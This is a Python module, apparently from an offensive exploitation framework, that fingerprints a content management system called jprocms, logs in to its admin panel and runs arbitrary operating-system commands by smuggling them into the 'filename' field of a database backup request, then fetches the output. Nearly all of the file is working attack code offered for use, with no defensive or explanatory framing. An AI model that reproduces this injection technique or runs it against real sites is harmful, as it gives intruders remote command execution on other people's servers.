#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""jprocms admin backup helpers."""

from __future__ import annotations

from typing import Optional, Tuple

from core.framework.base_module import BaseModule

LOGIN_PATHS = (
    "/admin/login.php",
    "/admin/",
    "/login.php",
    "/administrator/login.php",
)

BACKUP_PATHS = (
    "/admin/backup/db_backup.php",
    "/admin/db_backup.php",
    "/admin/backup.php",
)


class Jprocms(BaseModule):
    """jprocms fingerprint, login, and backup injection."""

    def jprocms_detected(self) -> bool:
        resp = self.http_request("GET", "/", timeout=12)
        if not resp:
            return False
        body = (resp.text or "").lower()
        if "jprocms" in body or "jp cms" in body:
            return True
        for path in LOGIN_PATHS:
            r2 = self.http_request("GET", path, timeout=10)
            if r2 and int(r2.status_code or 0) == 200 and "login" in (r2.text or "").lower():
                return True
        return False

    def jprocms_login(self, username: str, password: str) -> bool:
        data = {
            "username": username,
            "password": password,
            "user": username,
            "pass": password,
        }
        for path in LOGIN_PATHS:
            resp = self.http_request("POST", path, data=data, timeout=20, session=True)
            if not resp:
                continue
            body = (resp.text or "").lower()
            if int(resp.status_code or 0) == 200 and (
                "logout" in body or "dashboard" in body
            ):
                return True
        return False

    def jprocms_backup_inject(self, command: str) -> Tuple[bool, Optional[str], int]:
        inject = f"x;{command};#"
        data = {
            "filename": inject,
            "action": "backup",
            "db_name": "cms",
            "type": "full",
        }
        for path in BACKUP_PATHS:
            resp = self.http_request("POST", path, data=data, timeout=25, session=True)
            if not resp:
                continue
            code = int(resp.status_code or 0)
            if code == 200:
                out_resp = self.http_request("GET", "/admin/backups/x", timeout=15, session=True)
                output = (out_resp.text or "")[:500] if out_resp else None
                return True, output, code
        return False, None, 0